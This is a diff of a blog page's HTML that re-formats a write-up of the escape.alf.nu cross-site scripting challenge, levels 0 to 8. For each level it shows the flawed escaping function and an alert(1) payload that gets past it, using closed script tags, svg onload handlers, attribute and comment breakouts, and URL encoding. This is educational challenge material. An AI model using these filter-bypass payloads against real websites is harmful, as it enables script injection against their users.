@@ -109,55 +109,40 @@
 <p>…</p>
 <p>Ok so if you have already solve them or need some hits, here are my solutions</p>
 <h3 id="Level_0:">Level 0:</h3>
-<pre><code><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> {</span>
-    <span class="comment">// Warmup.  </span>
-    <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("</span><span class="string">'+s+'</span><span class="string">");&lt;/script&gt;'</span>;
-}
-</code></pre><p>There is no encoding so the easiest solution is to close “log” call and inject our “alert”</p>
-<p>Solution:</p>
-<pre><code><span class="string">");alert(1,"</span>
-</code></pre><h3 id="Level_1:">Level 1:</h3>
-<pre><code><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> {</span>
-    <span class="comment">// Escaping scheme courtesy of Adobe Systems, Inc.  </span>
-    s = <span class="transposed_variable">s.</span>replace(/<span class="string">"/g, '</span>\\<span class="string">"'</span>);  
-    <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("</span><span class="string">' + s + '</span><span class="string">");&lt;/script&gt;'</span>;
-}
-</code></pre><p>Function is escaping double quotes by adding two slashes. Shortest solution is to inject    \“    so the escape function turns it into</p>
-<pre><code><span class="command">\\</span><span class="command">\"</span>
-</code></pre><p>Effectively escaping the backslash but not the double quotes.</p>
-<p>Solution:</p>
-<pre><code>\");<span class="function">alert</span>(1)<span class="comment">//</span>
-</code></pre><h3 id="Level_2:">Level 2:</h3>
-<pre><code><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{  
-    s = <span class="built_in">JSON</span>.stringify(s);  
-    <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log('</span> + s + <span class="string">');&lt;/script&gt;'</span>;
-}
-</code></pre><p>JSON.stringify() will escape double quotes (“) into (\”) but it does not escaps angle brackets (&lt;&gt;), so we can close the current script block and start a brand new one.</p>
-<p>Solution:</p>
-<pre><code><span class="tag">&lt;/<span class="title">script</span>&gt;</span><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">alert(<span class="number">1</span>)<span class="comment">//</span></span>
-</code></pre><h3 id="Level_3:">Level 3:</h3>
-<pre><code><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{  
-    <span class="keyword">var</span> url = <span class="string">'javascript:console.log('</span> + <span class="built_in">JSON</span>.stringify(s) + <span class="string">')'</span>;
-    <span class="built_in">console</span>.log(url);  
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> {</span></div><div class="line">	<span class="comment">// Warmup.  </span></div><div class="line">	<span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("</span><span class="string">'+s+'</span><span class="string">");&lt;/script&gt;'</span>;</div><div class="line">}</div></pre></td></tr></table></figure>
 
-    <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);  
-    a.href = url;  
-    <span class="built_in">document</span>.body.appendChild(a);  
-    a.click();
-}
-</code></pre><p>Again (“) is escaped but since we are within a URL context we can use URL encoding. In this case %22 for (”)</p>
+<p>There is no encoding so the easiest solution is to close “log” call and inject our “alert”</p>
 <p>Solution:</p>
-<pre><code><span class="tag">%<span class="title">22</span></span>);alert(1)//
-</code></pre><h3 id="Level_4:">Level 4:</h3>
-<pre><code><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{  
-    <span class="keyword">var</span> text = s.replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'"'</span>, <span class="string">'&amp;quot;'</span>);  
-    <span class="comment">// URLs  </span>
-    text = text.replace(<span class="regexp">/(http:\/\/\S+)/g</span>, <span class="string">'&lt;a href="$1"&gt;$1&lt;/a&gt;'</span>);  
-    <span class="comment">// [[img123|Description]]  </span>
-    text = text.replace(<span class="regexp">/\[\[(\w+)\|(.+?)\]\]/g</span>, <span class="string">'&lt;img alt="$2" src="$1.gif"&gt;'</span>);  
-    <span class="keyword">return</span> text;
-}
-</code></pre><p>The following characters are replaced:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">");alert(1,"</span></div></pre></td></tr></table></figure>
+
+<h3 id="Level_1:">Level 1:</h3>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> {</span></div><div class="line">	<span class="comment">// Escaping scheme courtesy of Adobe Systems, Inc.  </span></div><div class="line">	s = <span class="transposed_variable">s.</span>replace(/<span class="string">"/g, '</span>\\<span class="string">"'</span>);  </div><div class="line">	<span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("</span><span class="string">' + s + '</span><span class="string">");&lt;/script&gt;'</span>;</div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>Function is escaping double quotes by adding two slashes. Shortest solution is to inject    \“    so the escape function turns it into</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="command">\\</span><span class="command">\"</span></div></pre></td></tr></table></figure>
+
+<p>Effectively escaping the backslash but not the double quotes.</p>
+<p>Solution:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">\");<span class="function">alert</span>(1)<span class="comment">//</span></div></pre></td></tr></table></figure>
+
+<h3 id="Level_2:">Level 2:</h3>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{  </div><div class="line">	s = <span class="built_in">JSON</span>.stringify(s);  </div><div class="line">	<span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log('</span> + s + <span class="string">');&lt;/script&gt;'</span>;</div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>JSON.stringify() will escape double quotes (“) into (\”) but it does not escaps angle brackets (&lt;&gt;), so we can close the current script block and start a brand new one.</p>
+<p>Solution:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">alert(<span class="number">1</span>)<span class="comment">//</span></span></div></pre></td></tr></table></figure>
+
+<h3 id="Level_3:">Level 3:</h3>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{  </div><div class="line">	<span class="keyword">var</span> url = <span class="string">'javascript:console.log('</span> + <span class="built_in">JSON</span>.stringify(s) + <span class="string">')'</span>;</div><div class="line">	<span class="built_in">console</span>.log(url);  </div><div class="line">	</div><div class="line">	<span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);  </div><div class="line">	a.href = url;  </div><div class="line">	<span class="built_in">document</span>.body.appendChild(a);  </div><div class="line">	a.click();</div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>Again (“) is escaped but since we are within a URL context we can use URL encoding. In this case %22 for (”)</p>
+<p>Solution:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">%<span class="title">22</span></span>);alert(1)//</div></pre></td></tr></table></figure>
+
+<h3 id="Level_4:">Level 4:</h3>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{  </div><div class="line">	<span class="keyword">var</span> text = s.replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&lt;'</span>).replace(<span class="string">'"'</span>, <span class="string">'&quot;'</span>);  </div><div class="line">	<span class="comment">// URLs  </span></div><div class="line">	text = text.replace(<span class="regexp">/(http:\/\/\S+)/g</span>, <span class="string">'&lt;a href="$1"&gt;$1&lt;/a&gt;'</span>);  </div><div class="line">	<span class="comment">// [[img123|Description]]  </span></div><div class="line">	text = text.replace(<span class="regexp">/\[\[(\w+)\|(.+?)\]\]/g</span>, <span class="string">'&lt;img alt="$2" src="$1.gif"&gt;'</span>);  </div><div class="line">	<span class="keyword">return</span> text;</div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>The following characters are replaced:</p>
 <ul>
 <li><p>&lt; → &lt; (all ocurrences)</p>
 </li>
@@ -165,73 +150,58 @@
 </li>
 </ul>
 <p>The escape function also use a template like [[src|alt]] that becomes、</p>
-<pre><code>&lt;img <span class="variable">alt=</span><span class="string">"alt"</span> <span class="variable">src=</span><span class="string">"src.gif"</span>&gt;
-</code></pre><p>We can use this template with any    src    and an    alt    starting with a double quote (“) that will be escaped, a second double quote (”) that won’t be escaped and then a new event handler like    onload=“alert(1)    that will be closed by the double quote inserted by the template.</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img <span class="variable">alt=</span><span class="string">"alt"</span> <span class="variable">src=</span><span class="string">"src.gif"</span>&gt;</div></pre></td></tr></table></figure>
+
+<p>We can use this template with any    src    and an    alt    starting with a double quote (“) that will be escaped, a second double quote (”) that won’t be escaped and then a new event handler like    onload=“alert(1)    that will be closed by the double quote inserted by the template.</p>
 <p>Solution:</p>
-<pre><code><span class="string">[[a|""onload="alert(1)]]</span>
-</code></pre><p>It will be rendered as:<br><img src="http://evilddog.qiniudn.com/escape.alf.nu_1.png" alt=""></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">[[a|""onload="alert(1)]]</span></div></pre></td></tr></table></figure>
+
+<p>It will be rendered as:<br><img src="http://evilddog.qiniudn.com/escape.alf.nu_1.png" alt=""></p>
 <h3 id="Level_5:">Level 5:</h3>
-<pre><code><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{
-       <span class="comment">// Level 4 had a typo, thanks Alok.</span>
-    <span class="comment">// If your solution for 4 still works here, you can go back and get more points on level 4 now.</span>
-    <span class="keyword">var</span> text = s.replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>);
-    <span class="comment">// URLs</span>
-    text = text.replace(<span class="regexp">/(http:\/\/\S+)/g</span>, <span class="string">'&lt;a href="$1"&gt;$1&lt;/a&gt;'</span>);
-    <span class="comment">// [[img123|Description]]</span>
-    text = text.replace(<span class="regexp">/\[\[(\w+)\|(.+?)\]\]/g</span>, <span class="string">'&lt;img alt="$2" src="$1.gif"&gt;'</span>);
-    <span class="keyword">return</span> text;
-}
-</code></pre><p>Now we cannot rely on the (    “    ) regexp typo but we can still use the template function to generate an image tag executing our    alert(1)    when loaded. We will use any    src    and a URL that will be replaced by the second replace function.</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{</div><div class="line">  		<span class="comment">// Level 4 had a typo, thanks Alok.</span></div><div class="line">	<span class="comment">// If your solution for 4 still works here, you can go back and get more points on level 4 now.</span></div><div class="line">	<span class="keyword">var</span> text = s.replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&lt;'</span>).replace(<span class="regexp">/"/g</span>, <span class="string">'&quot;'</span>);</div><div class="line">   	<span class="comment">// URLs</span></div><div class="line">   	text = text.replace(<span class="regexp">/(http:\/\/\S+)/g</span>, <span class="string">'&lt;a href="$1"&gt;$1&lt;/a&gt;'</span>);</div><div class="line">   	<span class="comment">// [[img123|Description]]</span></div><div class="line">   	text = text.replace(<span class="regexp">/\[\[(\w+)\|(.+?)\]\]/g</span>, <span class="string">'&lt;img alt="$2" src="$1.gif"&gt;'</span>);</div><div class="line">   	<span class="keyword">return</span> text;</div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>Now we cannot rely on the (    “    ) regexp typo but we can still use the template function to generate an image tag executing our    alert(1)    when loaded. We will use any    src    and a URL that will be replaced by the second replace function.</p>
 <p>Solution:</p>
-<pre><code><span class="string">[[a|http://onload='alert(1)']]</span>
-</code></pre><p>The first replace function wont trigger with this payload</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">[[a|http://onload='alert(1)']]</span></div></pre></td></tr></table></figure>
+
+<p>The first replace function wont trigger with this payload</p>
 <p>The second replace function will act on the URL getting:</p>
-<pre><code><span class="string">[[a|&lt;a href="http://onload='alert(1)']]</span><span class="string">"&gt;http://onload='alert(1)']]&lt;/a&gt;</span>
-</code></pre><p>The third replace function will create our      img      tag</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">[[a|&lt;a href="http://onload='alert(1)']]</span><span class="string">"&gt;http://onload='alert(1)']]&lt;/a&gt;</span></div></pre></td></tr></table></figure>
+
+<p>The third replace function will create our      img      tag</p>
 <p>It will be rendered as:<br><img src="http://evilddog.qiniudn.com/escape.alf.nu_2.png" alt=""></p>
 <h3 id="Level_6:">Level 6:</h3>
-<pre><code><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{  
-    <span class="comment">// Slightly too lazy to make two input fields.  </span>
-    <span class="comment">// Pass in something like "TextNode#foo"  </span>
-    <span class="keyword">var</span> m = s.split(<span class="regexp">/#/</span>);  
-    <span class="comment">// Only slightly contrived at this point.  </span>
-    <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);  
-    a.appendChild(<span class="built_in">document</span>[<span class="string">'create'</span>+m[<span class="number">0</span>]].apply(<span class="built_in">document</span>, m.slice(<span class="number">1</span>)));  
-    <span class="keyword">return</span> a.innerHTML;
-}
-</code></pre><p>The trick is to review all the functions in the DOM that begin with “create” and that dont escape characters. The shortest one is to use “createComment”. For example    Comment#<foo>    will create the following code:</foo></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{  </div><div class="line">	<span class="comment">// Slightly too lazy to make two input fields.  </span></div><div class="line">	<span class="comment">// Pass in something like "TextNode#foo"  </span></div><div class="line">	<span class="keyword">var</span> m = s.split(<span class="regexp">/#/</span>);  </div><div class="line">	<span class="comment">// Only slightly contrived at this point.  </span></div><div class="line">	<span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);  </div><div class="line">	a.appendChild(<span class="built_in">document</span>[<span class="string">'create'</span>+m[<span class="number">0</span>]].apply(<span class="built_in">document</span>, m.slice(<span class="number">1</span>)));  </div><div class="line">	<span class="keyword">return</span> a.innerHTML;</div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>The trick is to review all the functions in the DOM that begin with “create” and that dont escape characters. The shortest one is to use “createComment”. For example    Comment#<foo>    will create the following code:</foo></p>
 <pre><code><span class="comment">&lt;!--&lt;foo&gt;--&gt;</span>
 </code></pre><p>From there, its easy to go to:</p>
-<pre><code>Comment<span class="comment">#&gt;&lt;svg onload=alert(1)</span>
-</code></pre><p>That will render:</p>
-<pre><code><span class="comment">&lt;!--&gt;&lt;svg onload=alert(1)--&gt;</span>
-</code></pre><h3 id="Level_7:">Level 7:</h3>
-<pre><code><span class="xml"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{  
-    <span class="comment">// Pass inn "callback#userdata"  </span>
-    <span class="keyword">var</span> thing = s.split(<span class="regexp">/#/</span>);  
-    <span class="keyword">if</span> (!<span class="regexp">/^[a-zA-Z\[\]']*$/</span>.test(thing[<span class="number">0</span>])) <span class="keyword">return</span> <span class="string">'Invalid callback'</span>;  
-    <span class="keyword">var</span> obj = {<span class="string">'userdata'</span>: thing[<span class="number">1</span>] };  
-    <span class="keyword">var</span> json = <span class="built_in">JSON</span>.stringify(obj).replace(<span class="regexp">/&lt;/g</span>, <span class="string">'\\u003c'</span>);  
-    <span class="keyword">return</span> <span class="string">"&lt;script&gt;"</span> + thing[<span class="number">0</span>] + <span class="string">"("</span> + json +<span class="string">")</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>";
-}</span>
-</code></pre><p>We will enclose the opening bracket and the json fixed contents with single quotes to transform it into a string and then we will be able to inject our js payload:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Comment<span class="comment">#&gt;&lt;svg onload=alert(1)</span></div></pre></td></tr></table></figure>
+
+<p>That will render:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--&gt;&lt;svg onload=alert(1)--&gt;</span></div></pre></td></tr></table></figure>
+
+<h3 id="Level_7:">Level 7:</h3>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{  </span></span></div><div class="line">	<span class="comment">// Pass inn "callback#userdata"  </span></div><div class="line">	<span class="keyword">var</span> thing = s.split(<span class="regexp">/#/</span>);  </div><div class="line">	<span class="keyword">if</span> (!<span class="regexp">/^[a-zA-Z\[\]']*$/</span>.test(thing[<span class="number">0</span>])) <span class="keyword">return</span> <span class="string">'Invalid callback'</span>;  </div><div class="line">	<span class="keyword">var</span> obj = {<span class="string">'userdata'</span>: thing[<span class="number">1</span>] };  </div><div class="line">	<span class="keyword">var</span> json = <span class="built_in">JSON</span>.stringify(obj).replace(<span class="regexp">/&lt;/g</span>, <span class="string">'\\u003c'</span>);  </div><div class="line">	<span class="keyword">return</span> <span class="string">"&lt;script&gt;"</span> + thing[<span class="number">0</span>] + <span class="string">"("</span> + json +<span class="string">")</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>";</div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>We will enclose the opening bracket and the json fixed contents with single quotes to transform it into a string and then we will be able to inject our js payload:</p>
 <p>Solution:</p>
-<pre><code><span class="string">'#'</span>;alert(<span class="number">1</span>)<span class="comment">//</span>
-</code></pre><p>It will render:</p>
-<pre><code><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"><span class="string">'({"userdata":"'</span>;alert(<span class="number">1</span>)<span class="comment">//"})</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
-</code></pre><h3 id="Level_8:">Level 8:</h3>
-<pre><code><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> {  </span>
-    <span class="comment">// Courtesy of Skandiabanken  </span>
-    <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("</span><span class="string">' + s.toUpperCase() + '</span><span class="string">")&lt;/script&gt;'</span>;
-}
-</code></pre><p>There is no escaping function, only an upper case, so we can close the exisiting”script”tag and create a new tag (case insensitive) with an    onload  script using no alpha characters:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'#'</span>;alert(<span class="number">1</span>)<span class="comment">//</span></div></pre></td></tr></table></figure>
+
+<p>It will render:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"><span class="string">'({"userdata":"'</span>;alert(<span class="number">1</span>)<span class="comment">//"})</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>
+
+<h3 id="Level_8:">Level 8:</h3>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> {  </span></div><div class="line">	<span class="comment">// Courtesy of Skandiabanken  </span></div><div class="line">	<span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("</span><span class="string">' + s.toUpperCase() + '</span><span class="string">")&lt;/script&gt;'</span>;</div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>There is no escaping function, only an upper case, so we can close the exisiting”script”tag and create a new tag (case insensitive) with an    onload  script using no alpha characters:</p>
 <p>These are some valid solutions:</p>
-<pre><code><span class="xml"><span class="tag">&lt;/<span class="title">script</span>&gt;</span><span class="tag">&lt;<span class="title">svg</span>&gt;</span><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">alert(<span class="number">1</span>)<span class="comment">//   (52)</span>
-</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span><span class="tag">&lt;<span class="title">svg</span> <span class="attribute">onload</span>=<span class="value">alert(1)</span>//   (<span class="attribute">51</span>)
-&lt;/<span class="attribute">script</span>&gt;</span><span class="tag">&lt;<span class="title">svg</span> <span class="attribute">onload</span>=<span class="value">alert(1)</span>//   (<span class="attribute">50</span>)</span></span>
-</code></pre><p>I guess people solving the challange with 28 characters or so did something like:</p>
-<pre><code><span class="tag">&lt;/<span class="title">script</span>&gt;</span><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"&lt;very short domain&gt;"</span>&gt;</span><span class="javascript"></span>
-</code></pre><h2 id="Part2"><a href="http://evilddog.github.io/2014/10/12/escape-alf-nu-write-ups-2/" target="_blank" rel="external">Part2</a></h2>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="tag">&lt;/<span class="title">script</span>&gt;</span><span class="tag">&lt;<span class="title">svg</span>&gt;</span><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">alert(<span class="number">1</span>)<span class="comment">//   (52)</span></span></span></div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span><span class="tag">&lt;<span class="title">svg</span> <span class="attribute">onload</span>=<span class="value">alert(1)</span>//   (<span class="attribute">51</span>)</span></div><div class="line">&lt;/<span class="attribute">script</span>&gt;<span class="tag">&lt;<span class="title">svg</span> <span class="attribute">onload</span>=<span class="value">alert(1)</span>//   (<span class="attribute">50</span>)</span></div></pre></td></tr></table></figure>
+
+<p>I guess people solving the challange with 28 characters or so did something like:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"&lt;very short domain&gt;"</span>&gt;</span><span class="javascript"></span></div></pre></td></tr></table></figure>
+
+<h2 id="Part2"><a href="http://evilddog.github.io/2014/10/12/escape-alf-nu-write-ups-2/" target="_blank" rel="external">Part2</a></h2>
 
       
     </div>
